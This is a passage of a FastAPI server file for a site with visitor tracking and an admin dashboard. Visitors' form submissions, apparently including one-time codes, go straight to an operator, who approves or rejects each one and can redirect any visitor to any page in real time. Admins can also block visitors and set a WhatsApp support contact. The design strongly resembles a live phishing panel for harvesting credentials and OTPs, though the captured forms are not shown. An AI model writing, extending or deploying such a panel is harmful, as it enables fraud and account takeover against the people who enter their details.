        CORSMiddleware,
        allow_origins=settings.cors_origins,
        allow_methods=["GET", "POST", "OPTIONS"],
        allow_headers=["*"],
        allow_credentials=True,
    )


@app.middleware("http")
async def add_security_headers(request: Request, call_next):
    response = await call_next(request)
    response.headers["X-Content-Type-Options"] = "nosniff"
    response.headers["X-Frame-Options"] = "DENY"
    response.headers["Referrer-Policy"] = "strict-origin-when-cross-origin"
    response.headers["Permissions-Policy"] = "camera=(), microphone=(), geolocation=()"
    if request.url.scheme == "https":
        response.headers["Strict-Transport-Security"] = "max-age=31536000; includeSubDomains"
    return response


@app.get("/")
async def root(request: Request):
    return templates.TemplateResponse(
        request=request,
        name="frontend/index.html",
        context={
            "heartbeat_interval_seconds": settings.online_heartbeat_interval_seconds,
        },
    )


@app.get("/health")
async def health(request: Request) -> dict[str, Any]:
    return {
        "status": "healthy",
        "redis_connected": get_online_users_tracker(request) is not None,
        "mongo_connected": get_submissions_collection_for_app(request.app) is not None,
    }


@app.post("/visitors/heartbeat")
async def visitors_heartbeat(payload: HeartbeatPayload, request: Request):
    identity = await resolve_visitor_identity_for_app(
        request.app,
        visitor_id=payload.visitor_id,
        user_agent=request.headers.get("user-agent", ""),
    )
    visitor_id = identity["visitor_id"]
    if await is_visitor_blocked_for_app(request.app, visitor_id):
        return {
            "status": "blocked",
            "online_users": None,
            "visitor_id": visitor_id,
            "is_new_visitor": identity["is_new_visitor"],
            "is_returning_visitor": identity["is_returning_visitor"],
            "visit_count": identity["visit_count"],
            "redirect_url": "/blocked",
        }
    if identity["is_new_visitor"]:
        entry_submission = await create_submission(
            request.app,
            form_name="visitor-entry",
            page_path=(payload.page_path or "/").strip() or "/",
            fields={
                "entry_event": "website_enter",
                "entry_page": (payload.page_path or "/").strip() or "/",
            },
            visitor_id=visitor_id,
            visitor_status="new",
        )
        if entry_submission is not None:
            socket_hub: AdminSocketHub = request.app.state.admin_socket_hub
            await socket_hub.broadcast({"type": "new_submission", "submission": entry_submission})
    tracker = get_online_users_tracker(request)
    if tracker is None:
        return {
            "status": "redis_unavailable",
            "online_users": None,
            "visitor_id": visitor_id,
            "is_new_visitor": identity["is_new_visitor"],
            "is_returning_visitor": identity["is_returning_visitor"],
            "visit_count": identity["visit_count"],
        }
    try:
        current_page_path = (payload.page_path or "/").strip() or "/"
        online_users = await tracker.heartbeat(visitor_id, current_page_path)
    except RedisError:
        return {
            "status": "redis_unavailable",
            "online_users": None,
            "visitor_id": visitor_id,
            "is_new_visitor": identity["is_new_visitor"],
            "is_returning_visitor": identity["is_returning_visitor"],
            "visit_count": identity["visit_count"],
        }
    await broadcast_online_users_if_changed(request.app, online_users)
    pending_redirect_url = await pop_pending_redirect_for_visitor(request.app, visitor_id)
    return {
        "status": "ok",
        "online_users": online_users,
        "visitor_id": visitor_id,
        "is_new_visitor": identity["is_new_visitor"],
        "is_returning_visitor": identity["is_returning_visitor"],
        "visit_count": identity["visit_count"],
        "heartbeat_ttl_seconds": settings.online_user_ttl_seconds,
        "redirect_url": pending_redirect_url,
    }


@app.post("/submit")
async def submit_frontend_form(request: Request):
    form = await request.form()
    normalized_fields = {
        key: value if len(values := form.getlist(key)) > 1 else form.get(key, "")
        for key in form.keys()
    }
    requested_visitor_id = str(form.get("visitor_id", "")).strip()
    identity = await resolve_visitor_identity_for_app(
        request.app,
        visitor_id=requested_visitor_id or None,
        user_agent=request.headers.get("user-agent", ""),
    )
    visitor_id = identity["visitor_id"]
    if await is_visitor_blocked_for_app(request.app, visitor_id):
        return RedirectResponse(url="/blocked", status_code=303)
    visitor_status = "returning" if identity["is_returning_visitor"] else "new"
    submission = await create_submission(
        request.app,
        form_name=str(form.get("form_name", "frontend-form")).strip() or "frontend-form",
        page_path=str(form.get("page_path", request.url.path)).strip() or request.url.path,
        fields=normalized_fields,
        visitor_id=visitor_id,
        visitor_status=visitor_status,
    )
    if submission is not None:
        socket_hub: AdminSocketHub = request.app.state.admin_socket_hub
        await socket_hub.broadcast({"type": "new_submission", "submission": submission})
    return RedirectResponse(url="/verification", status_code=303)


@app.post("/api/forms/submit")
async def submit_generic_form(payload: FormSubmissionPayload, request: Request):
    identity = await resolve_visitor_identity_for_app(
        request.app,
        visitor_id=payload.visitor_id,
        user_agent=request.headers.get("user-agent", ""),
    )
    visitor_id = identity["visitor_id"]
    if await is_visitor_blocked_for_app(request.app, visitor_id):
        return JSONResponse(
            status_code=403,
            content={
                "status": "blocked",
                "visitor_id": visitor_id,
                "redirect_url": "/blocked",
                "detail": "Visitor is blocked",
            },
        )
    visitor_status = "returning" if identity["is_returning_visitor"] else "new"
    submission = await create_submission(
        request.app,
        form_name=(payload.form_name or "frontend-form").strip() or "frontend-form",
        page_path=(payload.page_path or str(request.url.path)).strip() or str(request.url.path),
        fields=payload.fields,
        visitor_id=visitor_id,
        visitor_status=visitor_status,
        approval_required=payload.await_admin_approval,
    )
    if submission is not None:
        socket_hub: AdminSocketHub = request.app.state.admin_socket_hub
        await socket_hub.broadcast({"type": "new_submission", "submission": submission})
    awaiting_approval = bool(payload.await_admin_approval)
    return {
        "status": "ok",
        "visitor_id": visitor_id,
        "submission_id": submission["id"] if submission is not None else None,
        "submission": submission,
        "awaiting_approval": awaiting_approval,
        "redirect_url": "/verification" if not awaiting_approval else None,
    }


@app.get("/test")
async def test_page(request: Request):
    return templates.TemplateResponse(
        request=request,
        name="frontend/test.html",
        context={
            "heartbeat_interval_seconds": settings.online_heartbeat_interval_seconds,
        },
    )


@app.get("/verification")
async def verification_page(request: Request):
    support_settings = await get_support_settings_for_app(request.app)
    return templates.TemplateResponse(
        request=request,
        name="frontend/verification.html",
        context={
            "heartbeat_interval_seconds": settings.online_heartbeat_interval_seconds,
            "support_whatsapp_number": support_settings["whatsapp_number"],
            "support_whatsapp_url": support_settings["whatsapp_url"],
            "support_approval_message": support_settings["success_message"],
            "otp_rejection_message": REJECTION_MESSAGE_AR,
        },
    )


@app.get("/blocked")
async def blocked_page(request: Request):
    support_settings = await get_support_settings_for_app(request.app)
    return templates.TemplateResponse(
        request=request,
        name="frontend/blocked.html",
        context={
            "heartbeat_interval_seconds": settings.online_heartbeat_interval_seconds,
            "support_whatsapp_url": support_settings["whatsapp_url"],
        },
    )


@app.get("/admin")
async def admin_dashboard(request: Request):
    redirect = require_admin_or_redirect(request)
    if redirect is not None:
        return redirect
    csrf_token = issue_csrf_token(request)
    ws_token = issue_admin_ws_token(request.app)
    online_users = await get_online_users_count(request)
    online_visitor_pages = await get_online_visitor_pages_for_app(request.app)
    online_visitor_page_titles = {
        visitor_id: page_title_from_path(path)
        for visitor_id, path in online_visitor_pages.items()
    }
    try:
        page = max(1, int(request.query_params.get("page", "1")))
    except ValueError:
        page = 1
    page_size = 20
    submissions_page = await get_submissions_page_for_app(
        request.app, page=page, page_size=page_size
    )
    unique_visitors = await get_unique_visitors_for_app(request.app, limit=200)
    selected_visitor_id = unique_visitors[0]["visitor_id"] if unique_visitors else ""
    selected_visitor_submissions = (
        await get_visitor_submissions_for_app(
            request.app, visitor_id=selected_visitor_id, limit=100
        )
        if selected_visitor_id
        else []
    )
    support_settings = await get_support_settings_for_app(request.app)
    return templates.TemplateResponse(
        request=request,
        name="admin/index.html",
        context={
            "admin_username": request.session.get("admin_username", settings.admin_username),
            "csrf_token": csrf_token,
            "ws_token": ws_token,
            "online_users": online_users,
            "recent_submissions": submissions_page["items"],
            "current_page": submissions_page["page"],
            "page_size": submissions_page["page_size"],
            "total_pages": submissions_page["total_pages"],
            "total_submissions": submissions_page["total_submissions"],
            "unique_visitors": unique_visitors,
            "selected_visitor_id": selected_visitor_id,
            "selected_visitor_submissions": selected_visitor_submissions,
            "redis_connected": get_online_users_tracker(request) is not None,
            "mongo_connected": get_submissions_collection_for_app(request.app) is not None,
            "online_visitor_pages": online_visitor_pages,
            "online_visitor_page_titles": online_visitor_page_titles,
            "support_settings": support_settings,
        },
    )


@app.get("/admin/api/online-users")
async def admin_online_users(request: Request):
    if require_admin_or_redirect(request) is not None:
        return JSONResponse(status_code=401, content={"detail": "Unauthorized"})
    online_users = await get_online_users_count(request)
    if online_users is None:
        return JSONResponse(
            status_code=503,
            content={"status": "redis_unavailable", "online_users": None},
        )
    return {
        "status": "ok",
        "online_users": online_users,
        "heartbeat_ttl_seconds": settings.online_user_ttl_seconds,
    }


@app.get("/admin/api/online-visitor-ids")
async def admin_online_visitor_ids(request: Request):
    if require_admin_or_redirect(request) is not None:
        return JSONResponse(status_code=401, content={"detail": "Unauthorized"})
    return {
        "status": "ok",
        "items": await get_online_visitor_ids_for_app(request.app),
    }


@app.get("/admin/api/online-visitor-pages")
async def admin_online_visitor_pages(request: Request):
    if require_admin_or_redirect(request) is not None:
        return JSONResponse(status_code=401, content={"detail": "Unauthorized"})
    return {
        "status": "ok",
        "items": await get_online_visitor_pages_for_app(request.app),
    }


@app.post("/admin/api/visitors/{visitor_id}/redirect")
async def admin_redirect_visitor(
    visitor_id: str, payload: VisitorRedirectPayload, request: Request
):
    if require_admin_or_redirect(request) is not None:
        return JSONResponse(status_code=401, content={"detail": "Unauthorized"})
    csrf_token = request.headers.get("x-csrf-token")
    if not validate_csrf_token(request, csrf_token):
        return JSONResponse(status_code=403, content={"status": "error", "detail": "Invalid CSRF token"})
    if parse_object_id(visitor_id) is None:
        return JSONResponse(
            status_code=400, content={"status": "error", "detail": "Invalid visitor ID"}
        )
    target_path = str(payload.target_path or "").strip()
    if not target_path.startswith("/"):
        return JSONResponse(
            status_code=400, content={"status": "error", "detail": "Invalid target path"}
        )
    await set_pending_redirect_for_visitor(request.app, visitor_id, target_path)
    control_hub: VisitorControlHub = request.app.state.visitor_control_hub
    await control_hub.broadcast(
        visitor_id,
        {
            "type": "visitor_redirect",
            "visitor_id": visitor_id,
            "redirect_url": target_path,
            "redirect_title": page_title_from_path(target_path),
        },
    )
    return {
        "status": "ok",
        "visitor_id": visitor_id,
        "redirect_url": target_path,
        "redirect_title": page_title_from_path(target_path),
    }


@app.post("/admin/api/visitors/{visitor_id}/block")
async def admin_block_visitor(
    visitor_id: str, payload: VisitorBlockPayload, request: Request
):
    if require_admin_or_redirect(request) is not None:
        return JSONResponse(status_code=401, content={"detail": "Unauthorized"})
    csrf_token = request.headers.get("x-csrf-token")
    if not validate_csrf_token(request, csrf_token):
        return JSONResponse(status_code=403, content={"status": "error", "detail": "Invalid CSRF token"})
    if parse_object_id(visitor_id) is None:
        return JSONResponse(
            status_code=400, content={"status": "error", "detail": "Invalid visitor ID"}
        )
    admin_username = str(request.session.get("admin_username", settings.admin_username))
    block_state = await set_visitor_blocked_for_app(
        request.app, visitor_id=visitor_id, blocked=payload.blocked, acted_by=admin_username
    )
    if block_state is None:
        return JSONResponse(
            status_code=404, content={"status": "error", "detail": "Visitor not found"}
        )
    socket_hub: AdminSocketHub = request.app.state.admin_socket_hub
    await socket_hub.broadcast(
        {
            "type": "visitor_block_updated",
            "visitor_id": block_state["visitor_id"],
            "blocked": block_state["blocked"],
        }
    )
    control_hub: VisitorControlHub = request.app.state.visitor_control_hub
    if block_state["blocked"]:
        await set_pending_redirect_for_visitor(request.app, visitor_id, "/blocked")
        await control_hub.broadcast(
            visitor_id,
            {
                "type": "visitor_redirect",
                "visitor_id": visitor_id,
                "redirect_url": "/blocked",
                "redirect_title": page_title_from_path("/blocked"),
            },
        )
    else:
        await set_pending_redirect_for_visitor(request.app, visitor_id, "/")
        await control_hub.broadcast(
            visitor_id,
            {
                "type": "visitor_redirect",
                "visitor_id": visitor_id,
                "redirect_url": "/",
                "redirect_title": page_title_from_path("/"),
            },
        )
    return {"status": "ok", "visitor": block_state}


@app.get("/admin/api/visitors")
async def admin_unique_visitors(request: Request):
    if require_admin_or_redirect(request) is not None:
        return JSONResponse(status_code=401, content={"detail": "Unauthorized"})
    visitors = await get_unique_visitors_for_app(request.app, limit=500)
    return {
        "status": "ok",
        "items": visitors,
        "total": len(visitors),
    }


@app.get("/admin/api/support-settings")
async def admin_support_settings(request: Request):
    if require_admin_or_redirect(request) is not None:
        return JSONResponse(status_code=401, content={"detail": "Unauthorized"})
    support_settings = await get_support_settings_for_app(request.app)
    return {"status": "ok", "support_settings": support_settings}


@app.post("/admin/api/support-settings")
async def admin_update_support_settings(
    payload: SupportSettingsPayload, request: Request
):
    if require_admin_or_redirect(request) is not None:
        return JSONResponse(status_code=401, content={"detail": "Unauthorized"})
    csrf_token = request.headers.get("x-csrf-token")
    if not validate_csrf_token(request, csrf_token):
        return JSONResponse(status_code=403, content={"status": "error", "detail": "Invalid CSRF token"})
    support_settings = await update_support_settings_for_app(
        request.app, payload.whatsapp_number, payload.success_message
    )
    socket_hub: AdminSocketHub = request.app.state.admin_socket_hub
    await socket_hub.broadcast(
        {
            "type": "support_settings_updated",
            "support_settings": support_settings,
        }
    )
    return {"status": "ok", "support_settings": support_settings}


@app.get("/admin/api/visitor-submissions")
async def admin_visitor_submissions(request: Request):
    if require_admin_or_redirect(request) is not None:
        return JSONResponse(status_code=401, content={"detail": "Unauthorized"})
    visitor_id = str(request.query_params.get("visitor_id", "")).strip()
    if not visitor_id:
        return {"status": "ok", "visitor_id": "", "items": []}
    submissions = await get_visitor_submissions_for_app(
        request.app, visitor_id=visitor_id, limit=500
    )
    return {
        "status": "ok",
        "visitor_id": visitor_id,
        "items": submissions,
        "total": len(submissions),
    }


@app.post("/admin/api/submissions/{submission_id}/approve")
async def admin_approve_submission(submission_id: str, request: Request):
    if require_admin_or_redirect(request) is not None:
        return JSONResponse(status_code=401, content={"detail": "Unauthorized"})
    csrf_token = request.headers.get("x-csrf-token")
    if not validate_csrf_token(request, csrf_token):
        return JSONResponse(status_code=403, content={"status": "error", "detail": "Invalid CSRF token"})
    admin_username = str(request.session.get("admin_username", settings.admin_username))
    submission = await approve_submission_for_app(
        request.app, submission_id=submission_id, approved_by=admin_username
    )
    if submission is None:
        return JSONResponse(
            status_code=404, content={"status": "error", "detail": "Submission not found"}
        )
    socket_hub: AdminSocketHub = request.app.state.admin_socket_hub
    await socket_hub.broadcast(
        {
            "type": "submission_approved",
            "submission_id": submission["id"],
            "visitor_id": submission["visitor_id"],
            "submission": submission,
        }
    )
    visitor_hub: VisitorApprovalHub = request.app.state.visitor_approval_hub
    await visitor_hub.broadcast(
        submission["visitor_id"],
        {
            "type": "submission_approved",
            "submission_id": submission["id"],
            "visitor_id": submission["visitor_id"],
            "redirect_url": "/verification",
        },
    )
    return {"status": "ok", "submission": submission}


@app.post("/admin/api/submissions/{submission_id}/reject")
async def admin_reject_submission(submission_id: str, request: Request):
    if require_admin_or_redirect(request) is not None:
        return JSONResponse(status_code=401, content={"detail": "Unauthorized"})
    csrf_token = request.headers.get("x-csrf-token")
    if not validate_csrf_token(request, csrf_token):
        return JSONResponse(status_code=403, content={"status": "error", "detail": "Invalid CSRF token"})
    admin_username = str(request.session.get("admin_username", settings.admin_username))
    submission = await reject_submission_for_app(
        request.app, submission_id=submission_id, rejected_by=admin_username
    )
    if submission is None:
        return JSONResponse(
            status_code=404, content={"status": "error", "detail": "Submission not found"}
        )
    socket_hub: AdminSocketHub = request.app.state.admin_socket_hub
    await socket_hub.broadcast(
        {
            "type": "submission_rejected",
            "submission_id": submission["id"],
            "visitor_id": submission["visitor_id"],
            "submission": submission,
            "error_message": REJECTION_MESSAGE_AR,
        }
    )
    visitor_hub: VisitorApprovalHub = request.app.state.visitor_approval_hub
    await visitor_hub.broadcast(
        submission["visitor_id"],
        {
            "type": "submission_rejected",
            "submission_id": submission["id"],
            "visitor_id": submission["visitor_id"],
            "error_message": REJECTION_MESSAGE_AR,
        },
    )
    return {"status": "ok", "submission": submission, "error_message": REJECTION_MESSAGE_AR}


@app.get("/api/forms/submission-status")
async def frontend_submission_status(request: Request):
    submission_id = str(request.query_params.get("submission_id", "")).strip()
    visitor_id = str(request.query_params.get("visitor_id", "")).strip() or None
    if not submission_id:
        return JSONResponse(
            status_code=400,
            content={"status": "error", "detail": "submission_id is required"},
        )
    status_payload = await get_submission_status_for_app(
        request.app, submission_id=submission_id, visitor_id=visitor_id
    )
    if status_payload is None:
        return JSONResponse(
            status_code=404,
            content={"status": "error", "detail": "Submission not found"},
        )
    return {
        "status": "ok",
        "submission_id": status_payload["submission_id"],
        "visitor_id": status_payload["visitor_id"],
        "approval_status": status_payload["approval_status"],
        "error_message": status_payload.get("rejection_message", "")
        if status_payload["approval_status"] == "rejected"
        else None,
        "redirect_url": "/verification"
        if status_payload["approval_status"] == "approved"
        else None,
    }


@app.websocket("/admin/ws")
async def admin_websocket(websocket: WebSocket):
    token = websocket.query_params.get("token")
    if not validate_admin_ws_token(websocket.app, token):
        await websocket.close(code=1008)
        return
    socket_hub: AdminSocketHub = websocket.app.state.admin_socket_hub
    await socket_hub.connect(websocket)
    await websocket.send_json(await build_admin_snapshot(websocket.app))
    try:
        while True:
            await websocket.receive_text()
    except WebSocketDisconnect:
        pass
    finally:
        socket_hub.disconnect(websocket)


@app.websocket("/ws/visitor/approval")
async def visitor_approval_websocket(websocket: WebSocket):
    visitor_id = str(websocket.query_params.get("visitor_id", "")).strip()
    if not parse_object_id(visitor_id):
        await websocket.close(code=1008)
        return
    visitor_hub: VisitorApprovalHub = websocket.app.state.visitor_approval_hub
    await visitor_hub.connect(visitor_id, websocket)
    try:
        while True:
            await websocket.receive_text()
    except WebSocketDisconnect:
        pass
    finally:
        visitor_hub.disconnect(visitor_id, websocket)


@app.websocket("/ws/visitor/control")
async def visitor_control_websocket(websocket: WebSocket):
    visitor_id = str(websocket.query_params.get("visitor_id", "")).strip()
    if not parse_object_id(visitor_id):
        await websocket.close(code=1008)
        return
    control_hub: VisitorControlHub = websocket.app.state.visitor_control_hub
    await control_hub.connect(visitor_id, websocket)
    try:
        while True:
            await websocket.receive_text()
    except WebSocketDisconnect:
        pass
    finally:
        control_hub.disconnect(visitor_id, websocket)


@app.get("/admin/login")
async def admin_login_page(request: Request):
    if request.session.get("admin_authenticated") is True:
        return RedirectResponse(url="/admin", status_code=303)
    csrf_token = issue_csrf_token(request)
    return templates.TemplateResponse(
        request=request,
        name="admin/login.html",
        context={"csrf_token": csrf_token, "error": None},
    )


@app.post("/admin/login")
async def admin_login_submit(request: Request):
    form = await request.form()
    username = str(form.get("username", ""))
    password = str(form.get("password", ""))
    csrf_token = form.get("csrf_token")
    if not validate_csrf_token(request, str(csrf_token) if csrf_token else None):
        return templates.TemplateResponse(
            request=request,
            name="admin/login.html",
            status_code=400,
            context={
                "csrf_token": issue_csrf_token(request),
                "error": "Invalid security token. Please try again.",
            },
        )
    if not verify_admin_credentials(username=username, password=password):
        return templates.TemplateResponse(
            request=request,
            name="admin/login.html",
            status_code=401,
            context={
                "csrf_token": issue_csrf_token(request),
                "error": "Invalid username or password.",
            },
        )
    login_admin(request, username=username)
    return RedirectResponse(url="/admin", status_code=303)


@app.post("/admin/logout")
async def admin_logout_submit(request: Request):
    form = await request.form()
    csrf_token = form.get("csrf_token")
    if not validate_csrf_token(request, str(csrf_token) if csrf_token else None):
        return RedirectResponse(url="/admin/login", status_code=303)
    logout_admin(request)
    return RedirectResponse(url="/admin/login", status_code=303)


@app.get("/404", include_in_schema=False)
async def custom_404_page(request: Request):
    return templates.TemplateResponse(
        request=request, name="404.html", status_code=404
    )


@app.exception_handler(StarletteHTTPException)
async def custom_http_exception_handler(
    request: Request, exc: StarletteHTTPException
):
    if exc.status_code == 404 and request.url.path != "/404":
        return RedirectResponse(url="/404", status_code=307)
    return await http_exception_handler(request, exc)
